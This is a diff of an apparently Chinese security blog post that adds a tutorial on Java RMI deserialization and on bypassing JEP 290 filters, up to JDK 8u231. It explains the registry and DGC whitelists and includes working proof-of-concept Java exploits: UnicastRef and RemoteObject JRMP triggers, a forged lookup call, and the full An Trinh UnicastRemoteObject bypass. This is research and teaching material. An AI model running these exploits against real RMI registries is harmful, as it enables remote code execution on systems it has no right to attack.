@@ -487,21 +487,21 @@ JEP290在JDK6u141、JDK7u131、JDK 8u121加入了JEP 290限制,JEP 290过滤策�
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-05-20
+                    2023-05-21
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.9k
+                    6.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    7 分
+                    26 分
                 </div>
                 
 
@@ -614,7 +614,389 @@ JEP290在JDK6u141、JDK7u131、JDK 8u121加入了JEP 290限制,JEP 290过滤策�
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520232514705.png" alt="image-20230520232514705"></p>
 <p>这个其实就是通过<code>setObjectInputFilter</code>调到<code>setInternalObjectInputFilter</code> 方法</p>
 <p>局部过滤器典型的例子是 RMI 中针对 <code>RegsitryImpl</code> 和 <code>DGCImpl</code>有关的过滤。</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1689/">https://paper.seebug.org/1689/</a> （前两部分基本上都抄的这个</p>
+<h1 id="JEP-290对RMI的限制"><a href="#JEP-290对RMI的限制" class="headerlink" title="JEP 290对RMI的限制"></a>JEP 290对RMI的限制</h1><p>在没有JEP 290之前，我们RMI攻击的路线有</p>
+<p>客户端攻击注册中心<br>服务端攻击注册中心<br>注册中心攻击客户端<br>服务端攻击客户端<br>客户端攻击服务端<br>DGC客户端攻击DGC服务端<br>DGC服务端攻击DGC客户端<br>JRMP服务端攻击JRMP客户端</p>
+<p>接下来我们看一下JEP 290限制了什么</p>
+<p>这里就不跟代码了，直接贴结果</p>
+<p>1、RegistryImpl_Skel强制RegistryImpl.checkAccess验证<br>限制服务端和注册中心必须在同一host，相当于强制将服务端和注册中心绑定在一起，也就没有这两者之间的远程互相攻击了。<br>2、配置了registry过滤器<br>RegistryImpl_Skel里面的对象反序列化时会进行白名单校验，内容如下：</p>
+<pre class="language-java" data-language="java"><code class="language-java">if (String.class &#x3D;&#x3D; clazz
+                 || java.lang.Number.class.isAssignableFrom(clazz)
+                 || Remote.class.isAssignableFrom(clazz)
+                 || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)
+                 || UnicastRef.class.isAssignableFrom(clazz)
+                 || RMIClientSocketFactory.class.isAssignableFrom(clazz)
+                 || RMIServerSocketFactory.class.isAssignableFrom(clazz)
+                 || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz)
+                 || java.rmi.server.UID.class.isAssignableFrom(clazz)) &#123;
+             return ObjectInputFilter.Status.ALLOWED;
+         &#125; else &#123;
+             return ObjectInputFilter.Status.REJECTED;
+         &#125;</code></pre>
+
+<p>也就是白名单有</p>
+<p>String / Number / Remote / Proxy / UnicastRef / RMIClientSocketFactory / RMIServerSocketFactory / ActivationID / UID</p>
+<p>只要反序列化的类不是白名单中的类，就会返回 REJECTED 操作符，表示序列化流中有不合法的内容，直接抛出异常。</p>
+<p>没有任何一条完整的反序列化攻击链能通过这个白名单，这样前面攻击注册中心的方法都失效了。<br><strong>但RegistryImpl_Stub里面的方法没有过滤，毕竟为了功能正常使用是没办法白名单的，所以注册中心攻击客户端依然可行。</strong></p>
+<p><strong>3、配置了DGC过滤器</strong></p>
+<p>DGC里的白名单校验更加严格</p>
+<p>DGCImpl_Skel和DGCImpl_Stub里面的对象反序列化时会进行白名单校验，内容如下：</p>
+<pre class="language-java" data-language="java"><code class="language-java">return (clazz &#x3D;&#x3D; ObjID.class ||
+                 clazz &#x3D;&#x3D; UID.class ||
+                 clazz &#x3D;&#x3D; VMID.class ||
+                 clazz &#x3D;&#x3D; Lease.class)
+                 ? ObjectInputFilter.Status.ALLOWED
+                 : ObjectInputFilter.Status.REJECTED;</code></pre>
+
+<p>这相当于直接断了攻击DGC的路</p>
+<p>所以现在，我们还有的攻击路线是</p>
+<p>客户端攻击服务端<br>服务端攻击客户端<br>注册中心攻击客户端<br>JRMP服务端攻击JRMP客户端</p>
+<p>这四种都是不用变的，但是我们想绕过JEP 290的限制应该怎么做呢？</p>
+<h1 id="RMI里的反序列化"><a href="#RMI里的反序列化" class="headerlink" title="RMI里的反序列化"></a>RMI里的反序列化</h1><p>既然JEP 290限制了我们反序列化的类，那我们就需要去找这里可以利用的类如何进行反序列化</p>
+<h2 id="1-UnicastRemoteObject"><a href="#1-UnicastRemoteObject" class="headerlink" title="1. UnicastRemoteObject"></a>1. UnicastRemoteObject</h2><p><code>java.rmi.server.UnicastRemoteObject</code> 类通常是远程调用接口实现类的父类，或直接使用其静态方法 <code>exportObject</code> 来创建动态代理并随机监听本机端口以提供服务。</p>
+<p>因此不难理解，在反序列化此类以及其子类后，依旧需要执行 <code>exportObject</code> 的相关操作，直接来看一下 UnicastRemoteObject 的 <code>readObject</code> 方法：</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521161051772.png" alt="image-20230521161051772"></p>
+<p>执行了reexport，又执行了 <code>exportObject</code> 方法。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521161121475.png" alt="image-20230521161121475"></p>
+<p>所以UnicastRemoteObject这个类进行反序列化的时候，就相当于成为了一个JRMP的服务端，然后如果存在恶意的JRMP客户端，就有可能被攻击。</p>
+<p><del>感觉这玩意怪鸡肋的，可能是我水平的问题，感觉和JRMPListener不是很像。JRMPListener是通过恶意JRMP服务端打客户端，但是这个是让自己监听自己的端口，相当于一个服务端，</del></p>
+<p>想了一下，可能是通过UnicastRemoteObject的反序列化，然后让被攻击端发起一个网络请求，变成一个JRMP服务端，然后我们就可以通过恶意的客户端去进行攻击了。UnicastRemoteObject也是Remote的子类，所以能进行反序列化不受影响。但是仅凭这玩意没法绕过JEP 290，因为最主要的还是恶意客户端攻击的时候传的payload</p>
+<h2 id="2-UnicastRef"><a href="#2-UnicastRef" class="headerlink" title="2. UnicastRef"></a>2. UnicastRef</h2><p><code>sun.rmi.server.UnicastRef</code> 类实现了 Externalizable 接口，因此在其反序列化时，会调用其 <code>readExternal</code> 方法执行额外的逻辑。</p>
+<p>UnicastRef 的 <code>readExternal</code> 方法调用 <code>LiveRef.read(var1, false)</code> 方法来还原成员变量 <code>LiveRef ref</code> 属性。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521165213006.png" alt="image-20230521165213006"></p>
+<p>LiveRef 的 <code>read</code> 方法在创建 LiveRef 对象后，调用 DGCClient 的 registerRefs 方法来将其在环境中进行注册。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521165339304.png" alt="image-20230521165339304"></p>
+<p>调用 <code>DGCClient$EndpointEntry#registerRefs</code> 方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521165410161.png" alt="image-20230521165410161"></p>
+<p>继续调用 <code>makeDirtyCall</code> 方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521165532081.png" alt="image-20230521165532081"></p>
+<p>然后就会调用dgc的dirty方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521165621111.png" alt="image-20230521165621111"></p>
+<p>因此可以看出，在 UnicastRef 进行反序列化时，会触发 DGC 通信及 dirty 方法调用，此时如果与一个恶意服务通信，返回恶意数据流，则会造成反序列化漏洞。</p>
+<p>poc</p>
+<pre class="language-java" data-language="java"><code class="language-java">public static void main(String[] args) throws Exception &#123;
+
+    String host &#x3D; &quot;127.0.0.1&quot;;
+    int    port &#x3D; 12233;
+
+    ObjID id  &#x3D; new ObjID(new Random().nextInt()); &#x2F;&#x2F; RMI registry
+    TCPEndpoint te  &#x3D; new TCPEndpoint(host, port);
+    UnicastRef ref &#x3D; new UnicastRef(new LiveRef(id, te, false));
+
+    ser(ref);
+    unser();
+&#125;</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521170202429.png" alt="image-20230521170202429"></p>
+<h2 id="3-RemoteObject"><a href="#3-RemoteObject" class="headerlink" title="3. RemoteObject"></a>3. RemoteObject</h2><p>RemoteObject 是几乎所有 RMI 远程调用类的父类。这个类也可以用来触发反序列化漏洞。</p>
+<p>RemoteObject 的 readObject 方法会先反序列化成员变量 <code>RemoteRef ref</code> ，最后调用其 readExternal 方法，可以用来触发上一条 UnicastRef 链。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1633660408218.png" alt="1633660408218"></p>
+<p>因此我们随便找一个 RemoteObject 的子类，在其实例中放入 UnicastRef 对象，反序列化时均可触发利用链。例如如下利用代码，</p>
+<pre class="language-java" data-language="java"><code class="language-java">public static void main(String[] args) throws Exception &#123;
+
+    String host &#x3D; &quot;127.0.0.1&quot;;
+    int    port &#x3D; 12233;
+
+    ObjID id  &#x3D; new ObjID(new Random().nextInt()); &#x2F;&#x2F; RMI registry
+    TCPEndpoint te  &#x3D; new TCPEndpoint(host, port);
+    UnicastRef ref &#x3D; new UnicastRef(new LiveRef(id, te, false));
+    RMIServerImpl_Stub stub &#x3D; new RMIServerImpl_Stub(ref);
+
+    ser(stub);
+    unser();
+&#125;</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521170839576.png" alt="image-20230521170839576"></p>
+<h1 id="绕过JEP-290"><a href="#绕过JEP-290" class="headerlink" title="绕过JEP 290"></a>绕过JEP 290</h1><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20211201211404548.png" alt="image-20211201211404548"></p>
+<p>根据我们前面说的，我们可以得到这样一个绕过JEP 290的方法</p>
+<p>首先借助RMI原生的、且在白名单里的类，将其作为客户端的参数，然后在注册中心进行反序列化读取的时候，触发JRMP请求，我们可以规定向我们的恶意JRMP服务端进行请求，这样就可以实现对JEP 290的绕过</p>
+<p>服务端代码不变</p>
+<p>客户端为</p>
+<pre class="language-java" data-language="java"><code class="language-java">public class RMIClient &#123;
+    public static void main(String[] args) throws Exception &#123;
+        Registry registry &#x3D; LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1098);
+        &#x2F;&#x2F;unicastref构造反序列化
+        String host &#x3D; &quot;127.0.0.1&quot;;
+        int    port &#x3D; 12233;
+        ObjID id  &#x3D; new ObjID(new Random().nextInt()); &#x2F;&#x2F; RMI registry
+        TCPEndpoint te  &#x3D; new TCPEndpoint(host, port);
+        UnicastRef ref1 &#x3D; new UnicastRef(new LiveRef(id, te, false));
+        RMIServerImpl_Stub stub &#x3D; new RMIServerImpl_Stub(ref1);
+
+        &#x2F;&#x2F;获取ref
+        Class&lt;?&gt; RO &#x3D; Class.forName(&quot;java.rmi.server.RemoteObject&quot;);
+        Field declaredField &#x3D; RO.getDeclaredField(&quot;ref&quot;);
+        declaredField.setAccessible(true);
+        RemoteRef ref0 &#x3D; (RemoteRef)declaredField.get(registry);
+        &#x2F;&#x2F;获取 operations
+        Class&lt;?&gt; RegistryImpl_Stub &#x3D; Class.forName(&quot;sun.rmi.registry.RegistryImpl_Stub&quot;);
+        Field operations_field &#x3D; RegistryImpl_Stub.getDeclaredField(&quot;operations&quot;);
+        operations_field.setAccessible(true);
+        Operation[] operations &#x3D; (Operation[])operations_field.get(registry);
+
+        Object o &#x3D; cc1.cc1exp();
+&#x2F;&#x2F;伪造lookup
+        RemoteCall var2 &#x3D; ref0.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);
+        ObjectOutput var3 &#x3D; var2.getOutputStream();
+        var3.writeObject(stub);
+        ref0.invoke(var2);
+    &#125;</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521181302761.png" alt="image-20230521181302761"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521181134141.png" alt="image-20230521181134141"></p>
+<h1 id="JDK8u231"><a href="#JDK8u231" class="headerlink" title="JDK8u231"></a>JDK8u231</h1><p>没环境了，照抄了（</p>
+<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>而在jdk8u231中，RMI又增加了新的安全措施。<br>首先是对注册中心进行了加固，更新后的RegistryImpl_Skel#dispatch</p>
+<pre class="language-java" data-language="java"><code class="language-java">case 2: &#x2F;&#x2F; lookup(String)
+&#123;
+    java.lang.String $param_String_1;
+    try &#123;
+        java.io.ObjectInput in &#x3D; call.getInputStream();
+        $param_String_1 &#x3D; (java.lang.String) in.readObject();
+    &#125; catch (ClassCastException | IOException | ClassNotFoundException e) &#123;
+        call.discardPendingRefs();
+        throw new java.rmi.UnmarshalException(&quot;error unmarshalling arguments&quot;, e);
+    &#125; finally &#123;
+        call.releaseInputStream();
+    &#125;
+    java.rmi.Remote $result &#x3D; server.lookup($param_String_1);
+    try &#123;
+        java.io.ObjectOutput out &#x3D; call.getResultStream(true);
+        out.writeObject($result);
+    &#125; catch (java.io.IOException e) &#123;
+        throw new java.rmi.MarshalException(&quot;error marshalling return&quot;, e);
+    &#125;
+    break;
+&#125;
+......</code></pre>
+
+<p>可以和8u231之前的比较一下</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521182330772.png" alt="image-20230521182330772"></p>
+<p>其实就多了一行<code> call.discardPendingRefs();</code>,但是这个方法会在反序列化出错之后把incomingRefTable清空。那么在ConnectionInputStream#registerRefs就进不去ConnectionInputStream#registerRefs了。而且由于我们是自己重写的lookup，传的是个Object类型而不是String，所以在强转的时候一定会进catch里的</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521182655046.png" alt="image-20230521182655046"></p>
+<p>还有一处修复在DGCImpl_Stub</p>
+<pre class="language-java" data-language="java"><code class="language-java">public void clean(java.rmi.server.ObjID[] $param_arrayOf_ObjID_1, long $param_long_2, java.rmi.dgc.VMID $param_VMID_3, boolean $param_boolean_4)
+            throws java.rmi.RemoteException &#123;
+        try &#123;
+            StreamRemoteCall call &#x3D; (StreamRemoteCall)ref.newCall((java.rmi.server.RemoteObject) this,
+                    operations, 0, interfaceHash);
+            call.setObjectInputFilter(DGCImpl_Stub::leaseFilter);
+            try &#123;
+                java.io.ObjectOutput out &#x3D; call.getOutputStream();
+                out.writeObject($param_arrayOf_ObjID_1);
+                out.writeLong($param_long_2);
+                out.writeObject($param_VMID_3);
+                out.writeBoolean($param_boolean_4);
+            &#125; catch (java.io.IOException e) &#123;
+                throw new java.rmi.MarshalException(&quot;error marshalling arguments&quot;, e);
+            &#125;
+            ref.invoke(call);
+            ref.done(call);
+        &#125; catch (java.lang.RuntimeException e) &#123;
+            throw e;
+        &#125; catch (java.rmi.RemoteException e) &#123;
+            throw e;
+        &#125; catch (java.lang.Exception e) &#123;
+            throw new java.rmi.UnexpectedException(&quot;undeclared checked exception&quot;, e);
+        &#125;
+    &#125;
+
+    &#x2F;&#x2F; implementation of dirty(ObjID[], long, Lease)
+    public java.rmi.dgc.Lease dirty(java.rmi.server.ObjID[] $param_arrayOf_ObjID_1, long $param_long_2, java.rmi.dgc.Lease $param_Lease_3)
+            throws java.rmi.RemoteException &#123;
+        try &#123;
+            StreamRemoteCall call &#x3D;
+                    (StreamRemoteCall)ref.newCall((java.rmi.server.RemoteObject) this,
+                            operations, 1, interfaceHash);
+            call.setObjectInputFilter(DGCImpl_Stub::leaseFilter);
+            try &#123;
+                java.io.ObjectOutput out &#x3D; call.getOutputStream();
+                out.writeObject($param_arrayOf_ObjID_1);
+                out.writeLong($param_long_2);
+                out.writeObject($param_Lease_3);
+            &#125; catch (java.io.IOException e) &#123;
+                throw new java.rmi.MarshalException(&quot;error marshalling arguments&quot;, e);
+            &#125;
+            ref.invoke(call);
+            java.rmi.dgc.Lease $result;
+            Connection connection &#x3D; call.getConnection();
+            try &#123;
+                java.io.ObjectInput in &#x3D; call.getInputStream();
+
+                $result &#x3D; (java.rmi.dgc.Lease) in.readObject();
+            &#125; catch (ClassCastException | IOException | ClassNotFoundException e) &#123;
+                if (connection instanceof TCPConnection) &#123;
+                    &#x2F;&#x2F; Modified to prevent re-use of the connection after an exception
+                    ((TCPConnection) connection).getChannel().free(connection, false);
+                &#125;
+                call.discardPendingRefs();
+                throw new java.rmi.UnmarshalException(&quot;error unmarshalling return&quot;, e);
+            &#125; finally &#123;
+                ref.done(call);
+            &#125;
+            return $result;
+        &#125; catch (java.lang.RuntimeException e) &#123;
+            throw e;
+        &#125; catch (java.rmi.RemoteException e) &#123;
+            throw e;
+        &#125; catch (java.lang.Exception e) &#123;
+            throw new java.rmi.UnexpectedException(&quot;undeclared checked exception&quot;, e);
+        &#125;
+    &#125;</code></pre>
+
+<p>和之前的比一下</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521182935214.png" alt="image-20230521182935214"></p>
+<p>可以看到它把setObjectInputFilter方法提前了，在旧版本中，我们攻击JRMP客户端的时候直接调用了ref.invoke(call);去触发反序列化，对于后面的过滤器可以不用考虑，但是现在过滤器在我们的反序列化之前了。</p>
+<p>这对于之前的JRMP攻击方式来说都是致命的</p>
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>从前面的分析可以知道，如果想在不知道远程接口的情况想攻击注册中心/服务端，目前能控制的最大范围就是注册中心和DGC的filter里面限制的几个类。</p>
+<p>这里绕过思路很容易想到，思路大致是：在<code>RegistryImpl_Skel#dispatch</code>反序列化时(还没反序列化完，绕过报错)，在这里就发出JRMP请求，不需要后面的releaseInputStream，同时也不需要在DGC客户端的ConnectionInputStream中完成readObject，而是另起一道来执行(绕过DGC层过滤)。</p>
+<p>但是真正去找这么一条利用链是很困难的。我们要先看一下白名单有哪些可以用：<br>1、RegistryImpl_Skel，允许Remote/UnicastRef/RMIClientSocketFactory/RMIServerSocketFactory/ActivationID/UID<br>2、DGCImpl_Skel，允许ObjID/UID/VMID/Lease<br>看看这些类哪些是可以序列化并且重写了readObject/readExternal之类改变调用流程的，找了下有这些：<br>UnicastRef<br>UnicastRef2<br>UnicastServerRef<br>ActivationID<br>RemoteObject<br>UnicastRemoteObject</p>
+<p>这里我直接说了，在JDK8u231的情况下，采用的是UnicastRemoteObject实现的反序列化绕过</p>
+<p>这是一条由国外的An Trinh师傅提出来的攻击方法，原文在[这篇文章][An Trinhs RMI Registry Bypass | MOGWAI LABS<a target="_blank" rel="noopener" href="https://mogwailabs.de/en/blog/2020/02/an-trinhs-rmi-registry-bypass/)]%E9%87%8C">https://mogwailabs.de/en/blog/2020/02/an-trinhs-rmi-registry-bypass/)]里</a></p>
+<p>这个payload会在<strong>readobject函数调用过程</strong>直接触发JRMP请求</p>
+<p>在8u231之前，我们的反序列化攻击的流程是</p>
+<ol>
+<li><strong>readobject反序列化的过程会递归反序列化我们的对象，一直反序列化到我们的UnicastRef类。</strong></li>
+<li><strong>在readobejct反序列化的过程中填装UnicastRef类到<code>incomingRefTable</code></strong></li>
+<li><strong>在releaseInputStream语句中从incomingRefTable中读取ref进行开始JRMP请求</strong></li>
+</ol>
+<p>而An Trinh这条利用链的攻击流程是</p>
+<ol>
+<li><strong>readobject递归反序列化到payload对象中的UnicastRef对象，填装UnicastRef对象的ref到<code>incomingRefTable</code></strong></li>
+<li><strong>在根据readobject的第二个最著名的特性：会调用对象自实现的readobject方法，会执行UnicastRemoteObject的readObject，An Trinh的Gadgets会在这里触发一次JRMP请求</strong></li>
+<li><strong>在releaseInputStream语句中从<code>incomingRefTable</code>中读取ref进行开始JRMP请求</strong></li>
+</ol>
+<p>这个利用链的开始点是UnicastRemoteObject的readObject方法。和我们之前说的在RMI里的反序列化那章的UnicastRemoteObject不同，这里在调用reexport后，对ssf进行了填充</p>
+<p>因此会进入else里的exportObject</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521204325976.png" alt="image-20230521204325976"></p>
+<p>然后遇见exportObject就往里跟，最后会发现调用了TCPTransport的exportObject方法，其中又调用了listen方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521204524317.png" alt="image-20230521204524317"></p>
+<p>listen里调用了TCPEndpoint类的newServerSocket方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521204702729.png" alt="image-20230521204702729"></p>
+<p>在这里，他调用了我们ssf的createServerSocket方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521204831307.png" alt="image-20230521204831307"></p>
+<p>那假如我们这里的ssf是个代理类，就可以先进入代理类的invoke方法了</p>
+<p>要知道，我们绕这么一大圈，最后还是要走UnicastRef#invoke-&gt;StreamRemoteCall#executeCall-&gt;注册中心/服务端攻击客户端这条路</p>
+<p>这里的这个代理类就是RemoteObjectInvocationHandler</p>
+<p>为什么选这个类呢，因为重载了我们之前用的UnicastRef的invoke方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521210125014.png" alt="image-20230521210125014"></p>
+<p>在重载后的这个invoke里，同样调用了executeCall</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521205832911.png" alt="image-20230521205832911"></p>
+<p>从分析里就能看出来，这个只需要把ssf设置成一个代理RMIServerSocketFactory接口的动态代理，里面放RemoteObjectInvocationHandler，调用这里时最终就触发了executeCall</p>
+<p>不过在在之后还有一个问题</p>
+<p>就是在RegistryImpl_Stub的方法里调用了writeObject，而writeObject里有个判断</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521230608649.png" alt="image-20230521230608649"></p>
+<p>如果enableReplace为true。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/t010c68f5a4abd1ff40.png" alt="img"></p>
+<p>检测我们要序列化的obj，是否实现Remote/RemoteStub，由于UnicastRemoteObject实现了Remote，没有实现RemoteStub，于是会进入判断，就会替换我们的obj，以至于反序列化的时候不能还原我们构造的类。</p>
+<p>所以，需要把enableReplace改为false。</p>
+<p>（这是<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/211722#h3-5%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E7%9A%84%E4%BB%A3%E7%A0%81%E5%9B%BE%EF%BC%8C%E4%BD%86%E6%98%AF%E6%88%91%E6%9C%AC%E5%9C%B0%E7%9A%848u231%E7%89%88%E6%9C%AC%E9%87%8C%E7%9A%84writeObject%E5%B9%B6%E4%B8%8D%E9%95%BF%E8%BF%99%E6%A0%B7%EF%BC%8C%E8%80%8C%E4%B8%94%E8%B0%83%E8%AF%95%E7%9A%84%E6%97%B6%E5%80%99enableReplace%E6%9C%AC%E6%9D%A5%E5%B0%B1%E6%98%AFfalse%EF%BC%8C%E5%BE%88%E6%80%AA%EF%BC%8C%E4%BD%86%E6%98%AF%E7%94%B1%E4%BA%8E%E6%B2%A1%E6%9C%89%E6%89%BE%E5%88%B0%E5%8E%9F%E5%9B%A0%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E9%80%89%E6%8B%A9%E7%9B%B8%E4%BF%A1%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%EF%BC%8C%E5%8F%AF%E8%83%BD%E6%98%AF%E5%9B%A0%E4%B8%BA%E6%88%91%E6%B2%A1%E6%9C%89231%E7%9A%84%E6%BA%90%E7%A0%81%E6%89%80%E4%BB%A5%E8%B0%83%E8%AF%95%E7%9A%84%E6%97%B6%E5%80%99%E5%87%BA%E4%BA%86%E7%82%B9%E9%97%AE%E9%A2%98">https://www.anquanke.com/post/id/211722#h3-5这篇文章的代码图，但是我本地的8u231版本里的writeObject并不长这样，而且调试的时候enableReplace本来就是false，很怪，但是由于没有找到原因，所以我选择相信这篇文章，可能是因为我没有231的源码所以调试的时候出了点问题</a></p>
+<p>抄一个exp，这个原本是重写了bind方法的，我试着重写了lookup方法，也能触发</p>
+<pre class="language-java" data-language="java"><code class="language-java">public class BypassJEP290ByUnicastRemoteObject &#123;
+    public static void main(String[] args) throws Exception &#123;
+        UnicastRemoteObject payload &#x3D; getPayload();
+        Registry registry &#x3D; LocateRegistry.getRegistry(1098);
+&#x2F;&#x2F;        bindReflection(&quot;pwn&quot;, payload, registry);
+        lookupReflection(payload, registry);
+    &#125;
+
+    static UnicastRemoteObject getPayload() throws Exception &#123;
+        ObjID id &#x3D; new ObjID(new Random().nextInt());
+        TCPEndpoint te &#x3D; new TCPEndpoint(&quot;localhost&quot;, 12233);
+        UnicastRef ref &#x3D; new UnicastRef(new LiveRef(id, te, false));
+
+        System.getProperties().put(&quot;sun.misc.ProxyGenerator.saveGeneratedFiles&quot;, &quot;true&quot;);
+        RemoteObjectInvocationHandler handler &#x3D; new RemoteObjectInvocationHandler(ref);
+        RMIServerSocketFactory factory &#x3D; (RMIServerSocketFactory) Proxy.newProxyInstance(
+                handler.getClass().getClassLoader(),
+                new Class[]&#123;RMIServerSocketFactory.class, Remote.class&#125;,
+                handler
+        );
+
+        Constructor&lt;UnicastRemoteObject&gt; constructor &#x3D; UnicastRemoteObject.class.getDeclaredConstructor();
+        constructor.setAccessible(true);
+        UnicastRemoteObject unicastRemoteObject &#x3D; constructor.newInstance();
+
+        Field field_ssf &#x3D; UnicastRemoteObject.class.getDeclaredField(&quot;ssf&quot;);
+        field_ssf.setAccessible(true);
+        field_ssf.set(unicastRemoteObject, factory);
+
+        return unicastRemoteObject;
+    &#125;
+
+    static void bindReflection(String name, Object obj, Registry registry) throws Exception &#123;
+        Field ref_filed &#x3D; RemoteObject.class.getDeclaredField(&quot;ref&quot;);
+        ref_filed.setAccessible(true);
+        UnicastRef ref &#x3D; (UnicastRef) ref_filed.get(registry);
+
+        Field operations_filed &#x3D; RegistryImpl_Stub.class.getDeclaredField(&quot;operations&quot;);
+        operations_filed.setAccessible(true);
+        Operation[] operations &#x3D; (Operation[]) operations_filed.get(registry);
+
+        RemoteCall remoteCall &#x3D; ref.newCall((RemoteObject) registry, operations, 0, 4905912898345647071L);
+        ObjectOutput outputStream &#x3D; remoteCall.getOutputStream();
+
+        Field enableReplace_filed &#x3D; ObjectOutputStream.class.getDeclaredField(&quot;enableReplace&quot;);
+        enableReplace_filed.setAccessible(true);
+        enableReplace_filed.setBoolean(outputStream, false);
+
+        outputStream.writeObject(name);
+        outputStream.writeObject(obj);
+
+        ref.invoke(remoteCall);
+        ref.done(remoteCall);
+    &#125;
+    static void lookupReflection(Object obj, Registry registry) throws Exception &#123;
+        Class&lt;?&gt; RO &#x3D; Class.forName(&quot;java.rmi.server.RemoteObject&quot;);
+        Field declaredField &#x3D; RO.getDeclaredField(&quot;ref&quot;);
+        declaredField.setAccessible(true);
+        RemoteRef ref0 &#x3D; (RemoteRef) declaredField.get(registry);
+        &#x2F;&#x2F;获取 operations
+        Class&lt;?&gt; RegistryImpl_Stub &#x3D; Class.forName(&quot;sun.rmi.registry.RegistryImpl_Stub&quot;);
+        Field operations_field &#x3D; RegistryImpl_Stub.getDeclaredField(&quot;operations&quot;);
+        operations_field.setAccessible(true);
+        Operation[] operations &#x3D; (Operation[]) operations_field.get(registry);
+&#x2F;&#x2F;伪造lookup
+        RemoteCall var2 &#x3D; ref0.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);
+        ObjectOutput var3 &#x3D; var2.getOutputStream();
+        Field enableReplace_filed &#x3D; ObjectOutputStream.class.getDeclaredField(&quot;enableReplace&quot;);
+        enableReplace_filed.setAccessible(true);
+        enableReplace_filed.setBoolean(var3, false);
+        var3.writeObject(obj);
+        ref0.invoke(var2);
+    &#125;
+&#125;</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521232049898.png" alt="image-20230521232049898"></p>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>另外还有一点关于JEP 290绕过方式的补充</p>
+<p>在JDK8u231之前，用那个payload打注册中心，会有一个现象，就是当客户端发送完请求之后，服务端会在经过一段时间后就弹一个计算器出来。</p>
+<p>这是由于DGCClient#registerRefs，可以看到这是个循环，如果epEntry.registerRefs返回的是false，就会一直卡在这个循环里</p>
+<p>其实<strong>这里是一个DGC客户端不断向DGC服务端汇报远程对象ref的存活状况，当ref不存在时，该方法的返回值就会是true了，然后就会跳出循环。这样就会造成一个有趣的现象：DGC客户端以一定的时间间隔向DGC服务端(恶意的JRMP服务端)发起请求，类似TCP连接的心跳包，又类似一个不死马，受攻击的DGC客户端(这里是Registry端)会以同频的时间间隔不断弹出计算器。</strong></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521232639466.png" alt="image-20230521232639466"></p>
+<p>调用栈</p>
+<pre class="language-txt" data-language="txt"><code class="language-txt">readObject:431, ObjectInputStream (java.io)
+executeCall:252, StreamRemoteCall (sun.rmi.transport)
+invoke:161, UnicastRef (sun.rmi.server)
+invokeRemoteMethod:227, RemoteObjectInvocationHandler (java.rmi.server)
